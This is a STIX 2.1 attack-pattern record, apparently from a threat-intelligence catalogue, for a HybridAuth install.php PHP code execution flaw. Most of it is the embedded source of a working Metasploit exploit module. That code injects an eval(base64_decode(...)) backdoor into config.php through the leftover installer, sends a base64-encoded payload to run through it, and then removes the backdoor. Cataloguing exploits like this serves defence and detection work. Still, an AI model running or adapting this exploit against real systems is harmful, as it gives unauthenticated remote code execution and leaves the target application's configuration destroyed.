{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e548b9f4-6eb1-4912-85b7-001bece8ceab",
    "created": "2024-08-14T17:13:09.759331Z",
    "modified": "2024-08-14T17:13:09.759335Z",
    "name": "HybridAuth install.php PHP Code Execution",
    "description": " This module exploits a PHP code execution vulnerability in HybridAuth versions 2.0.9 to 2.2.2. The install file 'install.php' is not removed after installation allowing unauthenticated users to write PHP code to the application configuration file 'config.php'.  Note: This exploit will overwrite the application configuration file rendering the application unusable.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/hybridauth_install_php_exec.rb",
            "external_id": "hybridauth_install_php_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # application config.php is overwritten\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HybridAuth install.php PHP Code Execution',\n      'Description'    => %q{\n          This module exploits a PHP code execution vulnerability in\n        HybridAuth versions 2.0.9 to 2.2.2. The install file 'install.php'\n        is not removed after installation allowing unauthenticated users to\n        write PHP code to the application configuration file 'config.php'.\n\n        Note: This exploit will overwrite the application configuration file\n        rendering the application unusable.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Pichaya Morimoto', # Discovery and PoC\n          'bcoles' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['EDB', '34273'],\n          ['OSVDB','109838']\n        ],\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          # Tested:\n          # HybridAuth versions 2.0.9, 2.0.10, 2.0.11, 2.1.2, 2.2.2 on Apache/2.2.14 (Ubuntu)\n          ['HybridAuth version 2.0.9 to 2.2.2 (PHP Payload)', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-08-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to HybridAuth library', '/hybridauth/'])\n      ])\n  end\n\n\n  #\n  # Check:\n  # * install.php exists\n  # * config.php is writable\n  # * HybridAuth version is 2.0.9 to 2.0.11, 2.1.x, or 2.2.0 to 2.2.2\n  #\n  def check\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'install.php')\n    if !res\n      vprint_error \"Connection failed\"\n      return Exploit::CheckCode::Unknown\n    elsif res.code == 404\n      vprint_error \"Could not find install.php\"\n    elsif res.body =~ />([^<]+)<\\/span> must be <b >WRITABLE</\n      vprint_error \"#{$1} is not writable\"\n    elsif res.body =~ />HybridAuth (2\\.[012]\\.[\\d\\.]+(-dev)?) Installer</\n      version = res.body.scan(/>HybridAuth (2\\.[012]\\.[\\d\\.]+(-dev)?) Installer</).first.first\n      vprint_status \"Found version: #{version}\"\n      if version =~ /^2\\.(0\\.(9|10|11)|1\\.[\\d]+|2\\.[012])/\n        return Exploit::CheckCode::Vulnerable\n      else\n        vprint_error \"HybridAuth version #{version} is not vulnerable\"\n      end\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  #\n  # Exploit\n  #\n  def exploit\n    # check vuln\n    if check != Exploit::CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, \"#{peer} - Target is not vulnerable\"\n    end\n\n    # write backdoor\n    print_status \"Writing backdoor to config.php\"\n    payload_param = rand(1000)\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'install.php'),\n      'data'   => \"OPENID_ADAPTER_STATUS=eval(base64_decode($_POST[#{payload_param}])))));/*\"\n    )\n    if !res\n      fail_with Failure::Unknown, \"#{peer} - Connection failed\"\n    elsif res.body =~ /Installation completed/\n      print_good \"Wrote backdoor successfully\"\n    else\n      fail_with Failure::UnexpectedReply, \"#{peer} - Coud not write backdoor to 'config.php'\"\n    end\n\n    # execute payload\n    code = Rex::Text.encode_base64(payload.encoded)\n    print_status \"Sending payload to config.php backdoor (#{code.length} bytes)\"\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'config.php'),\n      'data'   => \"#{payload_param}=#{code}\"\n    }, 5)\n    if !res\n      print_warning \"No response\"\n    elsif res.code == 404\n      fail_with Failure::NotFound, \"#{peer} - Could not find config.php\"\n    elsif res.code == 200 || res.code == 500\n      print_good \"Sent payload successfully\"\n    end\n\n    # remove backdoor\n    print_status \"Removing backdoor from config.php\"\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'install.php'),\n      'data'   => 'OPENID_ADAPTER_STATUS='\n    )\n    if !res\n      print_error \"Connection failed\"\n    elsif res.body =~ /Installation completed/\n      print_good \"Removed backdoor successfully\"\n    else\n      print_warning \"Could not remove payload from config.php\"\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-04",
    "x_mitre_platforms": [
        "php'"
    ]
}